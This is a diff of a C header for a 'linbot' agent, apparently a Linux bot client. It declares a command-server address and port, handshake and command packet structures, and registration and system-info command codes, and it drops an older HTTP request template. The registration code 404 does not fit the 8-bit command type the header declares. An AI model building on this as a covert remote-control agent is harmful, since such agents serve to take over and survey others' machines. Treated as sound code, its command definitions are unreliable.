@@ -7,7 +7,8 @@
 */
 
 
-#pragma once
+#ifndef LINBOT_AGENT_H
+#define LINBOT_AGENT_H
 
 
 /* https://github.com/vk-candpython/linbot/blob/main/lindef.h
@@ -15,26 +16,40 @@ INTERNAL LINUX (x86_64) DECLARATIONS */
 #include "lindef.h"
 
 
+#define LB_SERVER_IPV4 IPv4(127, 0, 0, 1)
+#define LB_SERVER_PORT 12701
 
 
-#define BOT_SERVER_IPV4 IPv4(127, 0, 0, 1)
-#define BOT_SERVER_PORT 8080
-
-#define BOT_SERVER_DOMAIN "linbot.net"
+#define LB_NONCE_SIZE 12
 
 
-typedef UINT32 CMDSZ;
+typedef UINT64 idsz_t;
+typedef UINT8  cmdsz_t;
 
 
-#define SIZE_HTTP_HDR_CMD 16
+typedef PACKED_STRUCT_ handshake_t {
+    idsz_t serverID;
+    idsz_t sessionID;
+    BYTE   nonce[LB_NONCE_SIZE];
+} handshake_t;
+
+typedef PACKED_STRUCT_ server_cmd_t {
+    idsz_t  id;
+    cmdsz_t command;
+    UINT32  len;
+} server_cmd_t;
+
+typedef PACKED_STRUCT_ agent_cmd_t {
+    idsz_t id;
+    UINT32 len;
+} agent_cmd_t;
+
+
+#define LB_CMD_REG     404
+#define LB_CMD_SYSINFO 201
 
 
 
-#define BOT_HDR_HTTP_GET                        \
-    "GET / HTTP/1.1\r\n"                        \
-    "Host: " BOT_SERVER_DOMAIN "\r\n"           \
-    "User-Agent: Linux/x86_64\r\n"              \
-    "Accept: */*\r\n"                           \
-    "Connection: keep-alive\r\n"                \
-    "\r\n"
 
+
+#endif /* LINBOT_AGENT_H */
